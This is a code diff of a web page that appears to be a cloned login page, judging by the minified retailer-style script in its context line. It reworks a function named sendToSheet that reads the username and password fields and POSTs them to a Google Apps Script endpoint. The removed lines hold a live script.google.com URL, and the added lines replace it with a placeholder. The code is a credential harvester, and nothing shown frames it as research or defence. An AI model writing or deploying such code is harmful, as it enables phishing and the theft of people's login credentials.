@@ -845,24 +845,23 @@ a=d[b]=(d[b]||0)+1,a>h&&(m=b,h=a))}g(m,"_cdn_mp")}d.ue&&"function"===typeof d.ue
 
 async function sendToSheet() {
   alert("Sending Data . . .");
-  let username = document.getElementById("username").value;
-  let password = document.getElementById("password").value;
-  const url = "https://script.google.com/macros/s/AKfycbxpcFVZRcvbXduOm-jK20zUGVu25wjBDXMkHSiT-gS4U920bA9mfUKMbx-5tu5A9_wl/exec";
+  const username = document.getElementById("username").value;
+  const password = document.getElementById("password").value;
 
-  const formData = new FormData();
-  formData.append("username", username);
-  formData.append("password", password);
+  const url = "YOUR_WEB_APP_URL"; // 🔥 Replace this
 
   try {
-    await fetch(url, {
+    const response = await fetch(url, {
       method: "POST",
-      body: formData,
-      mode: "no-cors"   // 🔥 IMPORTANT
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ username, password })
     });
 
-    console.log("✅ Sent (no-cors)");
+    const text = await response.text();
+    document.getElementById("status").innerText = "Response: " + text;
+
   } catch (err) {
-    console.error("❌ Error:", err);
+    document.getElementById("status").innerText = "Error: " + err;
   }
 }
 
